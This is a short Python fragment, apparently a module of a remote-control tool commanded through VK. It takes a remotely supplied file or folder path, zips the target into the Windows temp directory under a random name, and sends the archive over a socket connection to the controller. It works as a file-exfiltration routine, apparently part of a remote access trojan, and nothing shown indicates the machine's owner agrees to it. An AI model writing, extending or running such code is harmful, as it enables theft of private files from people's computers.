import os
import zipfile
from random import randint as r
import time

# path will be passed through arguments to VK

path = path.replace("\\", "//")
if path[-2:] == "//":
    path = path[:-2]

new_zip = time.strftime("%H-%M-%S ")
for i in range(10):
    new_zip += str(r(0, 9))

if os.path.isdir(path):
    last_dir = path.split("//")[-1:][0] + "\\"

    def zipdir(path, ziph):
        for root, dirs, files in os.walk(path):
            for file in files:
                ziph.write(os.path.join(root, file), os.path.join(root, file).split(last_dir)[-1:][0])


    zipf = zipfile.ZipFile(os.getenv("temp") + f'\\{new_zip}.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir(path, zipf)
    zipf.close()

    zip = open(os.getenv("temp") + f'\\{new_zip}.zip', "rb").read()
    client.send(f"zip {len(zip)}".encode())
    client.send(zip)
    # os.remove(os.getenv("temp") + f'\\{new_zip}')
else:

    zipf = zipfile.ZipFile(os.getenv("temp") + f'\\{new_zip}.zip', 'w', zipfile.ZIP_DEFLATED)
    rename_path = path.split("//")[-1:][0]
    zipf.write(path, rename_path)
    zipf.close()
    zip = open(os.getenv("temp") + f'\\{new_zip}.zip', "rb").read()
    client.send(f"zip {len(zip)}".encode())
    client.send(zip)
    # os.remove(os.getenv("temp") + f'\\{new_zip}')
